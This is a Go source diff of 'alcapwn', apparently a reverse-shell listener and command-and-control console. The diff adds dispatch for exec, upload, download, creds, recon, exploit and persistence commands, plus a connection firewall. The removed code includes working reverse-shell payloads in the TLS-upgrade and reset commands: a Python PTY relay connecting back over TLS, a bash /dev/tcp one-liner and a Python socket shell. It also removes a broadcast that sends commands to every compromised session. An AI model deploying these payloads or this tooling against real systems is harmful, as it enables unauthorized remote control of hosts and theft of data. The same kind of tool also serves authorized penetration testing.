@@ -3,13 +3,11 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
-	"encoding/json"
 	"fmt"
 	"io"
 	"net"
 	"os"
 	"os/signal"
-	"path/filepath"
 	"sort"
 	"strconv"
 	"strings"
@@ -37,7 +35,7 @@ func (p *consolePrinter) Notify(format string, args ...interface{}) {
 	p.mu.Lock()
 	defer p.mu.Unlock()
 	fmt.Print("\r\x1b[2K") // return to column 0, erase line
-	fmt.Printf(format+"\n", args...)
+	fmt.Println(colorizePrefixed(fmt.Sprintf(format, args...)))
 	p.console.editor.redrawLine(p.console.currentPrompt())
 }
 
@@ -461,6 +459,16 @@ type Console struct {
 	// instead of creating an unwanted new session.
 	pendingTLSMu      sync.Mutex
 	pendingTLSUpgrade map[string]chan net.Conn
+
+	// persistence and config
+	persistMu sync.Mutex
+	persist   *PersistenceStore
+	config    *Config
+	configMu  sync.Mutex
+
+	// firewall
+	firewallMu sync.Mutex
+	firewalls  *FirewallStore
 }
 
 // NewConsole creates a Console bound to the given registry and base opts.
@@ -471,8 +479,17 @@ func NewConsole(registry *Registry, opts sessionOpts) *Console {
 		opts:              opts,
 		pendingTLSUpgrade: make(map[string]chan net.Conn),
 		editor:            newLineEditor(int(os.Stdin.Fd())),
+		persist:           NewPersistenceStore(),
+		config:            &Config{AutoOpenListeners: true},
+		firewalls:         NewFirewallStore(),
 	}
 	c.printer = &consolePrinter{console: c}
+
+	// Load config and persistence if they exist
+	c.LoadConfig()
+	c.LoadPersistence()
+	c.LoadFirewalls()
+
 	return c
 }
 
@@ -546,16 +563,34 @@ func (c *Console) acceptLoop(ln net.Listener, entry *listenerEntry) {
 			return
 		}
 
+		// Enable TCP keepalives so the OS detects dead connections and closes
+		// them without needing an explicit heartbeat command.  The drain
+		// goroutine then receives the error and removes the session cleanly.
+		if tcpConn, ok := conn.(*net.TCPConn); ok {
+			_ = tcpConn.SetKeepAlive(true)
+			_ = tcpConn.SetKeepAlivePeriod(30 * time.Second)
+		}
+
+		srcIP := hostFromAddr(conn.RemoteAddr())
+
+		// Check firewall if listener has one assigned
+		if !c.checkFirewall(srcIP, entry.addr) {
+			c.printer.Notify("[!] Connection denied by firewall: %s", conn.RemoteAddr())
+			conn.Close()
+			continue
+		}
+
 		// If a manual 'tls <id>' upgrade is in flight for this source IP, hand
 		// the raw connection directly to its goroutine instead of creating a new
 		// session.  The goroutine does its own TLS peek + handshake.
-		srcIP := hostFromAddr(conn.RemoteAddr())
 		c.pendingTLSMu.Lock()
 		upgradeCh := c.pendingTLSUpgrade[srcIP]
 		c.pendingTLSMu.Unlock()
 		if upgradeCh != nil {
 			select {
 			case upgradeCh <- conn:
+				// Session will be created by cmdTLSUpgrade, auto-whitelist IP
+				c.autoWhitelistIP(srcIP)
 				continue // owned by cmdTLSUpgrade goroutine; skip normal path
 			default:
 				// Upgrade timed out; fall through to normal session handling.
@@ -590,7 +625,16 @@ func (c *Console) acceptLoop(ln net.Listener, entry *listenerEntry) {
 		sess.ListenerAddr = entry.addr
 
 		atomic.AddInt32(&entry.sessionCount, 1)
-		c.printer.Notify("[+] Session [%d] opened — %s", sess.ID, finalConn.RemoteAddr())
+
+		// Check if this looks like a reconnect from a named persistent session.
+		// If so, auto-label the new session with the stored name.
+		persistLabel := c.lookupPersistentName(srcIP, entry.addr)
+		if persistLabel != "" {
+			sess.Label = sanitizeLabel(persistLabel) // sanitize even though value came from us
+			c.printer.Notify("[+] Session [%d] opened — %s  (persistent: %s)", sess.ID, finalConn.RemoteAddr(), persistLabel)
+		} else {
+			c.printer.Notify("[+] Session [%d] opened — %s", sess.ID, finalConn.RemoteAddr())
+		}
 
 		sessOpts := c.opts
 		sessOpts.printer = c.printer
@@ -598,6 +642,8 @@ func (c *Console) acceptLoop(ln net.Listener, entry *listenerEntry) {
 		sessOpts.listenIP = listenIP
 		sessOpts.listenPort = listenPort
 		sessOpts.registerTLSWaiter = c.registerTLSWaiter
+		sessOpts.persist = c.persist
+		sessOpts.persistMu = &c.persistMu
 
 		go func(s *Session, o sessionOpts, e *listenerEntry) {
 			handleSession(s, o)
@@ -639,15 +685,41 @@ func (c *Console) Run() {
 		case "unlisten":
 			c.cmdUnlisten(args)
 		case "sessions":
-			c.cmdSessions()
+			c.cmdSessions(args)
 		case "use":
 			c.cmdUse(args)
 		case "kill":
 			c.cmdKill(args)
 		case "info":
 			c.cmdInfo(args)
+		case "exec":
+			c.cmdExec(args)
+		case "ps":
+			c.cmdPs(args)
+		case "killproc":
+			c.cmdKillproc(args)
 		case "export":
 			c.cmdExport(args)
+		case "firewall":
+			c.cmdFirewall(args)
+		case "download":
+			c.cmdDownload(args)
+		case "upload":
+			c.cmdUpload(args)
+		case "persist":
+			c.cmdPersist(args)
+		case "config":
+			c.cmdConfig(args)
+		case "labels":
+			c.cmdLabels(args)
+		case "notes":
+			c.cmdNotes(args)
+		case "recon":
+			c.cmdRecon(args)
+		case "creds":
+			c.cmdCreds(args)
+		case "exploit":
+			c.cmdExploit(args)
 		case "broadcast":
 			c.cmdBroadcast(args)
 		case "rename":
@@ -700,729 +772,6 @@ func (c *Console) handleSignals(ch <-chan os.Signal) {
 			os.Exit(0)
 		}
 	}
-}
-
-// ── Command implementations ───────────────────────────────────────────────────
-
-func (c *Console) cmdListen(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: listen <host:port>")
-		return
-	}
-	addr := args[0]
-	if _, _, err := net.SplitHostPort(addr); err != nil {
-		fmt.Printf("[!] Invalid address %q: %v\n", addr, err)
-		return
-	}
-	c.StartListener(addr)
-}
-
-func (c *Console) cmdListeners() {
-	entries := c.listeners.all()
-	if len(entries) == 0 {
-		fmt.Println("[*] No active listeners.")
-		return
-	}
-	fmt.Printf("  %-22s  %s\n", "Address", "Sessions")
-	fmt.Printf("  %-22s  %s\n", strings.Repeat("─", 22), strings.Repeat("─", 8))
-	for _, e := range entries {
-		n := int(atomic.LoadInt32(&e.sessionCount))
-		noun := "sessions"
-		if n == 1 {
-			noun = "session"
-		}
-		fmt.Printf("  %-22s  %d %s\n", e.addr, n, noun)
-	}
-}
-
-func (c *Console) cmdUnlisten(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: unlisten <port|host:port>")
-		return
-	}
-	query := args[0]
-	entry := c.listeners.findByPort(query)
-	if entry == nil {
-		// Try exact remove first.
-		entry = c.listeners.remove(query)
-	} else {
-		c.listeners.remove(entry.addr)
-	}
-	if entry == nil {
-		fmt.Printf("[!] No listener matching %q\n", query)
-		return
-	}
-	entry.ln.Close()
-	fmt.Printf("[*] Listener on %s closed.\n", entry.addr)
-}
-
-func (c *Console) cmdSessions() {
-	sessions := c.registry.All()
-	if len(sessions) == 0 {
-		fmt.Println("[*] No active sessions.")
-		return
-	}
-
-	fmt.Printf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s\n",
-		"ID", "Remote", "User", "OS", "CVEs", "TLS", "Age")
-	fmt.Printf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s\n",
-		"──", "────────────────────", "────────────", "────────────────────────", "────", "───", "───")
-
-	for _, s := range sessions {
-		s.mu.Lock()
-		age := fmtAge(time.Since(s.StartTime))
-		tlsStr := "✗"
-		if s.TLS {
-			tlsStr = "✓"
-		}
-
-		var user, osStr, cveStr string
-		suffix := ""
-
-		if s.Findings == nil {
-			user = "..."
-			osStr = "..."
-			cveStr = "..."
-			suffix = "  ← recon running"
-		} else {
-			if s.Findings.User != nil {
-				user = *s.Findings.User
-			} else {
-				user = "unknown"
-			}
-			if s.Findings.OS != nil {
-				osStr = *s.Findings.OS
-			} else {
-				osStr = "unknown"
-			}
-			cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
-		}
-
-		// Truncate long fields for display.
-		user = truncate(user, 12)
-		osStr = truncate(osStr, 24)
-
-		// Show label when set, otherwise strip port from remote addr.
-		remote := s.RemoteAddr
-		if h, _, err := net.SplitHostPort(remote); err == nil {
-			remote = h
-		}
-		if s.Label != "" {
-			remote = s.Label
-		}
-		remote = truncate(remote, 20)
-
-		s.mu.Unlock()
-
-		fmt.Printf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s\n",
-			s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)
-	}
-}
-
-func (c *Console) cmdUse(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: use <id>")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-
-	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is already active.\n", id)
-		return
-	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
-	if sess.Upgrader == nil {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
-		return
-	}
-	sess.State = SessionStateInteractive
-	sess.mu.Unlock()
-
-	c.state.mu.Lock()
-	c.state.activeSessionID = id
-	c.state.mu.Unlock()
-
-	c.interactWithSession(sess)
-
-	c.state.mu.Lock()
-	c.state.activeSessionID = 0
-	c.state.mu.Unlock()
-}
-
-func (c *Console) cmdKill(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: kill <id>")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-
-	sess.mu.Lock()
-	conn := sess.ActiveConn
-	plain := sess.Conn
-	sess.mu.Unlock()
-
-	if conn == nil {
-		conn = plain
-	}
-	if conn != nil {
-		killRemoteProcessGroup(conn)
-		conn.Close()
-	}
-	if plain != nil && plain != conn {
-		plain.Close()
-	}
-
-	c.registry.Remove(id)
-	fmt.Printf("[*] Session %d terminated.\n", id)
-}
-
-func (c *Console) cmdInfo(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: info <id>")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-
-	sess.mu.Lock()
-	findings := sess.Findings
-	matches := sess.Matches
-	sess.mu.Unlock()
-
-	if findings == nil {
-		fmt.Printf("[!] Recon still running for session %d.\n", id)
-		return
-	}
-	printSummary(findings, matches)
-}
-
-func (c *Console) cmdExport(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: export <id> [path]")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-
-	sess.mu.Lock()
-	findings := sess.Findings
-	remote := sess.RemoteAddr
-	label := sess.Label
-	sess.mu.Unlock()
-
-	if findings == nil {
-		fmt.Printf("[!] Recon still running for session %d — no findings to export yet.\n", id)
-		return
-	}
-
-	var outPath string
-	if len(args) >= 2 {
-		outPath = args[1]
-	} else {
-		var host string
-		if label != "" {
-			host = label
-		} else {
-			host = remote
-			if h, _, splitErr := net.SplitHostPort(remote); splitErr == nil {
-				host = h
-			}
-			host = sanitizeLabel(strings.ReplaceAll(host, ".", "_"))
-		}
-		ts := time.Now().Format("20060102_150405")
-		dir := c.opts.findingsDir
-		if dir == "" {
-			dir = "."
-		}
-		if err := os.MkdirAll(dir, 0700); err != nil {
-			fmt.Printf("[!] Could not create directory: %v\n", err)
-			return
-		}
-		outPath = filepath.Join(dir, fmt.Sprintf("findings_%s_%s.json", host, ts))
-	}
-
-	data, err := json.MarshalIndent(findings, "", "  ")
-	if err != nil {
-		fmt.Printf("[!] Marshal error: %v\n", err)
-		return
-	}
-	if err := os.WriteFile(outPath, data, 0600); err != nil {
-		fmt.Printf("[!] Write error: %v\n", err)
-		return
-	}
-	fmt.Printf("[*] Exported to %s\n", outPath)
-}
-
-func (c *Console) cmdBroadcast(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: broadcast <cmd>")
-		return
-	}
-	cmd := strings.Join(args, " ") + "\n"
-	sessions := c.registry.All()
-	count := 0
-	skipped := 0
-	for _, s := range sessions {
-		s.mu.Lock()
-		state := s.State
-		conn := s.ActiveConn
-		if conn == nil {
-			conn = s.Conn
-		}
-		s.mu.Unlock()
-		if state == SessionStateInteractive {
-			skipped++
-			continue
-		}
-		if conn != nil {
-			conn.Write([]byte(cmd)) //nolint:errcheck
-			count++
-		}
-	}
-	if skipped > 0 {
-		fmt.Printf("[*] Broadcast to %d session(s) (%d interactive skipped).\n", count, skipped)
-	} else {
-		fmt.Printf("[*] Broadcast to %d session(s).\n", count)
-	}
-}
-
-// cmdTLSUpgrade upgrades a plain session to TLS.
-//
-// The reconnecting connection is claimed via pendingTLSUpgrade so acceptLoop
-// never creates a spurious second session.  The command returns immediately
-// after sending the reconnect; a background goroutine waits for the connection,
-// performs the TLS handshake, and updates the session in-place.
-//
-// Downgrade (TLS → plain) is not supported: the Python relay has no revert
-// mechanism and weakening encryption mid-session has no legitimate purpose.
-func (c *Console) cmdTLSUpgrade(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: tls <id>")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-
-	sess.mu.Lock()
-	state := sess.State
-	alreadyTLS := sess.TLS
-	upgrader := sess.Upgrader
-	listenerAddr := sess.ListenerAddr
-	plainConn := sess.Conn
-	sess.mu.Unlock()
-
-	if alreadyTLS {
-		if c.opts.tlsEnabled {
-			fmt.Printf("[!] Session %d is already encrypted — alcapwn was started with --tls, TLS is mandatory on compatible sessions.\n", id)
-		} else {
-			fmt.Printf("[!] Session %d is already encrypted. Downgrade is not supported.\n", id)
-		}
-		return
-	}
-	if state == SessionStateInteractive {
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if state == SessionStateTerminated {
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
-	if upgrader == nil {
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
-		return
-	}
-
-	// Lazily generate an ephemeral TLS cert if --tls wasn't set at startup.
-	if c.opts.tlsCfg == nil {
-		if c.opts.verbosity >= 1 {
-			fmt.Println("[*] Generating ephemeral TLS certificate...")
-		}
-		tlsCfg, fp, genErr := generateEphemeralTLSConfig()
-		if genErr != nil {
-			fmt.Printf("[!] Failed to generate TLS certificate: %v\n", genErr)
-			return
-		}
-		c.opts.tlsCfg = tlsCfg
-		c.opts.fingerprint = fp
-		c.opts.fingerprintHex = strings.ToLower(strings.ReplaceAll(fp, ":", ""))
-		if c.opts.verbosity >= 1 {
-			fmt.Printf("[*] Ephemeral cert fingerprint: %s\n", fp)
-		}
-	}
-
-	// Stop any drain goroutine before we read/write plainConn for detection and
-	// the reconnect command.  The drain goroutine competes with upgrader.reader
-	// on the same socket — if it steals the ALCAPWN_PYEND sentinel bytes,
-	// detectPythonBin will time out and the upgrade silently fails.
-	c.stopDrain(sess)
-
-	// Python is needed on the remote to run the TLS relay.  detectPythonBin()
-	// skips detection when tlsMode was false at session-open time, so call it
-	// explicitly here.
-	if !upgrader.usedPython {
-		if c.opts.verbosity >= 1 {
-			fmt.Printf("[*] Detecting Python on session %d...\n", id)
-		}
-		// Give the shell a moment to settle before sending the Python check command
-		time.Sleep(200 * time.Millisecond)
-		upgrader.detectPythonBin()
-		if !upgrader.usedPython {
-			fmt.Printf("[!] No Python available on session %d — cannot upgrade to TLS.\n", id)
-			return
-		}
-	}
-
-	// Require an active listener for the target to reconnect to.
-	if c.listeners.findByPort(listenerAddr) == nil {
-		fmt.Printf("[!] Listener %s is no longer active — restart it and retry.\n", listenerAddr)
-		return
-	}
-
-	effectiveListenIP := strings.Trim(hostFromAddr(plainConn.LocalAddr()), "[]")
-	if effectiveListenIP == "" {
-		effectiveListenIP, _, _ = net.SplitHostPort(listenerAddr)
-	}
-	_, portStr, _ := net.SplitHostPort(listenerAddr)
-	listenPort := 4444
-	if p, convErr := strconv.Atoi(portStr); convErr == nil {
-		listenPort = p
-	}
-
-	reconnectCmd := fmt.Sprintf(
-		`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
-		upgrader.pythonBin, effectiveListenIP, listenPort, c.opts.fingerprintHex,
-	)
-
-	// Register the routing claim BEFORE sending the command so acceptLoop
-	// never races to accept the reconnect as a new session.
-	origIP := hostFromAddr(plainConn.RemoteAddr())
-	upgradeCh := make(chan net.Conn, 1)
-	c.pendingTLSMu.Lock()
-	c.pendingTLSUpgrade[origIP] = upgradeCh
-	c.pendingTLSMu.Unlock()
-
-	if writeErr := upgrader.write(reconnectCmd + "\n"); writeErr != nil {
-		c.pendingTLSMu.Lock()
-		delete(c.pendingTLSUpgrade, origIP)
-		c.pendingTLSMu.Unlock()
-		fmt.Printf("[!] Failed to send command to session %d: %v\n", id, writeErr)
-		return
-	}
-
-	if c.opts.verbosity >= 1 {
-		fmt.Printf("[*] Waiting for TLS reconnect from %s (10s timeout)...\n", origIP)
-	}
-
-	// The rest runs in a goroutine so the operator prompt returns immediately.
-	tlsCfg := c.opts.tlsCfg
-	verbosity := c.opts.verbosity
-	go func() {
-		defer func() {
-			c.pendingTLSMu.Lock()
-			delete(c.pendingTLSUpgrade, origIP)
-			c.pendingTLSMu.Unlock()
-		}()
-
-		var rawConn net.Conn
-		select {
-		case rawConn = <-upgradeCh:
-		case <-time.After(10 * time.Second):
-			if verbosity >= 1 {
-				c.printer.Notify("[!] Session %d TLS upgrade failed — reconnect timed out.", id)
-			} else {
-				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
-			}
-			return
-		}
-
-		// Verify TLS ClientHello and complete handshake.
-		buf := make([]byte, 1)
-		rawConn.Read(buf) //nolint:errcheck
-		if buf[0] != 0x16 {
-			rawConn.Close()
-			if verbosity >= 1 {
-				c.printer.Notify("[!] Session %d TLS upgrade failed — unexpected byte 0x%02x (expected TLS ClientHello 0x16).", id, buf[0])
-			} else {
-				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
-			}
-			return
-		}
-		candidate := tls.Server(&prefixConn{Conn: rawConn, prefix: buf}, tlsCfg)
-		if hsErr := candidate.Handshake(); hsErr != nil {
-			candidate.Close()
-			if verbosity >= 1 {
-				c.printer.Notify("[!] Session %d TLS upgrade failed — handshake: %v", id, hsErr)
-			} else {
-				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
-			}
-			return
-		}
-
-		// Upgrade in-place — session keeps its ID, no new session is created.
-		// Plain conn stays open (closing it sends SIGHUP to the remote pty.spawn).
-		upgrader.switchConn(candidate)
-		sess.mu.Lock()
-		sess.ActiveConn = candidate
-		sess.TLS = true
-		sess.mu.Unlock()
-
-		// Reinitialise terminal on the new bash spawned by the Python relay.
-		// Without this the new shell has no TERM, wrong stty size, and no
-		// readline line-editing — typing would appear to do nothing.
-		reinitTerminal(upgrader)
-
-		// Start a drain on the new TLS conn so remote output doesn't back up
-		// while the session is backgrounded between now and the next 'use'.
-		c.startDrain(sess, candidate)
-
-		c.printer.Notify("[+] Session %d upgraded to TLS successfully.", id)
-	}()
-}
-
-// cmdReset spawns a new reverse-shell connection from an existing session, then
-// tears down the old one.  The spawned process runs under setsid so it lives in
-// its own session and is not killed when the parent shell receives SIGHUP on
-// connection close.  The new shell arrives via the normal acceptLoop → handleSession
-// path, so it gets PTY upgrade, optional TLS, and recon automatically.
-func (c *Console) cmdReset(args []string) {
-	if len(args) == 0 {
-		fmt.Println("[!] Usage: reset <id>")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-
-	sess.mu.Lock()
-	state := sess.State
-	upgrader := sess.Upgrader
-	listenerAddr := sess.ListenerAddr
-	plainConn := sess.Conn
-	activeConn := sess.ActiveConn
-	if activeConn == nil {
-		activeConn = plainConn
-	}
-	sess.mu.Unlock()
-
-	if state == SessionStateInteractive {
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if state == SessionStateTerminated {
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
-		return
-	}
-	if upgrader == nil {
-		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
-		return
-	}
-
-	// Require an active listener so the new shell has somewhere to land.
-	entry := c.listeners.findByPort(listenerAddr)
-	if entry == nil {
-		fmt.Printf("[!] Listener %s is no longer active — restart it with 'listen %s' and retry.\n",
-			listenerAddr, listenerAddr)
-		return
-	}
-
-	// Derive the local IP the target originally connected to.
-	effectiveListenIP := strings.Trim(hostFromAddr(plainConn.LocalAddr()), "[]")
-	if effectiveListenIP == "" {
-		effectiveListenIP, _, _ = net.SplitHostPort(listenerAddr)
-	}
-	_, portStr, _ := net.SplitHostPort(listenerAddr)
-	listenPort := 4444
-	if p, convErr := strconv.Atoi(portStr); convErr == nil {
-		listenPort = p
-	}
-
-	// setsid puts the new bash in its own session so it survives the parent
-	// shell closing (no SIGHUP propagation).
-	//
-	// If TLS is enabled globally and Python was used for PTY upgrade,
-	// use the Python TLS relay so the new connection arrives encrypted.
-	// Cert verification is disabled via verify_mode=ssl.CERT_NONE.
-	var reconnectCmd string
-	if upgrader.UsedPython() && c.opts.tlsEnabled {
-		// Python TLS relay — fingerprint-pinned, identical to handleSession and
-		// cmdTLSUpgrade so all three TLS paths have the same MITM protection.
-		reconnectCmd = fmt.Sprintf(
-			`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
-			upgrader.PythonBin(), effectiveListenIP, listenPort, c.opts.fingerprintHex,
-		)
-	} else {
-		// Fallback: plain /dev/tcp or python socket
-		reconnectCmd = fmt.Sprintf(
-			`(setsid bash -i >& /dev/tcp/%s/%d 0>&1 2>&1 &) 2>/dev/null || `+
-				`(setsid python3 -c 'import socket,os,pty;s=socket.socket();`+
-				`s.connect(("%s",%d));[os.dup2(s.fileno(),f) for f in(0,1,2)];`+
-				`pty.spawn("/bin/bash")' &) 2>/dev/null`,
-			effectiveListenIP, listenPort,
-			effectiveListenIP, listenPort,
-		)
-	}
-
-	fmt.Printf("[*] Resetting session %d — spawning new shell to %s:%d...\n",
-		id, effectiveListenIP, listenPort)
-
-	if writeErr := upgrader.write(reconnectCmd + "\n"); writeErr != nil {
-		fmt.Printf("[!] Failed to send reset command to session %d: %v\n", id, writeErr)
-		return
-	}
-
-	// Give the spawned process a moment to connect before we close the parent.
-	// After close + Remove, acceptLoop will see the new connection as a fresh session.
-	time.Sleep(300 * time.Millisecond)
-
-	// Close the old session without killRemoteProcessGroup: we don't want to
-	// SIGKILL the newly spawned setsid'd process (different session but still
-	// same UID — pkill -g $$ would not reach it, but be safe and skip it).
-	if activeConn != nil {
-		activeConn.Close()
-	}
-	if plainConn != nil && plainConn != activeConn {
-		plainConn.Close()
-	}
-	c.registry.Remove(id)
-
-	fmt.Printf("[*] Session %d closed. New session will appear automatically when the target reconnects.\n", id)
-}
-
-func (c *Console) cmdRename(args []string) {
-	if len(args) < 2 {
-		fmt.Println("[!] Usage: rename <id> <name>")
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-	name := sanitizeLabel(args[1])
-	if name == "" {
-		fmt.Println("[!] Name must contain only letters, digits, '-', '_', or '.'")
-		return
-	}
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-	sess.mu.Lock()
-	sess.Label = name
-	sess.mu.Unlock()
-	fmt.Printf("[*] Session %d renamed to: %s\n", id, name)
-}
-
-func (c *Console) cmdFingerprint(args []string) {
-	if c.opts.fingerprint == "" {
-		fmt.Println("[!] No TLS certificate configured. Use --tls at startup or 'tls <id>' to generate one.")
-		return
-	}
-	if len(args) == 0 {
-		fmt.Printf("[*] TLS certificate fingerprint:\n    %s\n", c.opts.fingerprint)
-		return
-	}
-	id, err := strconv.Atoi(args[0])
-	if err != nil || id < 1 {
-		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
-		return
-	}
-	sess := c.registry.Get(id)
-	if sess == nil {
-		fmt.Printf("[!] No session with ID %d.\n", id)
-		return
-	}
-	sess.mu.Lock()
-	isTLS := sess.TLS
-	sess.mu.Unlock()
-	if !isTLS {
-		fmt.Printf("[!] Session %d is not TLS-encrypted.\n", id)
-		return
-	}
-	fmt.Printf("[*] Session %d TLS certificate fingerprint:\n    %s\n", id, c.opts.fingerprint)
-}
-
-func (c *Console) cmdHelp() {
-	fmt.Println(`
-  LISTENERS
-    listen <host:port>       Start a new TCP listener
-    listeners                List active listeners
-    unlisten <port|addr>     Stop a listener
-
-  SESSIONS
-    sessions                 List all active sessions
-    use <id>                 Attach to a session interactively (Ctrl+D to background)
-    kill <id>                Terminate a session
-    rename <id> <name>       Label a session (letters, digits, - _ . only)
-    tls <id>                 Upgrade a plain session to TLS encryption
-    fp [id]                  Show TLS certificate fingerprint (optionally confirm session)
-    reset <id>               Spawn a new shell from session, close the old one
-    info <id>                Print full recon summary for a session
-    export <id> [path]       Save findings JSON to disk
-    broadcast <cmd>          Send a command to all active sessions
-
-  OPERATOR
-    help                     Show this message
-    exit                     Exit alcapwn (prompts if sessions are active)`)
 }
 
 // doExit handles the 'exit' command and clean shutdown.
@@ -1947,18 +1296,5 @@ func (c *Console) interactWithSession(sess *Session) {
 		c.startDrain(sess, conn)
 		fmt.Printf("\r\n[*] Session [%d] backgrounded.\n", sess.ID)
 	}
-}
-
-// ── Helpers ───────────────────────────────────────────────────────────────────
-
-func fmtAge(d time.Duration) string {
-	d = d.Round(time.Second)
-	if d < time.Minute {
-		return fmt.Sprintf("%ds", int(d.Seconds()))
-	}
-	if d < time.Hour {
-		return fmt.Sprintf("%dm", int(d.Minutes()))
-	}
-	return fmt.Sprintf("%dh", int(d.Hours()))
 }
 
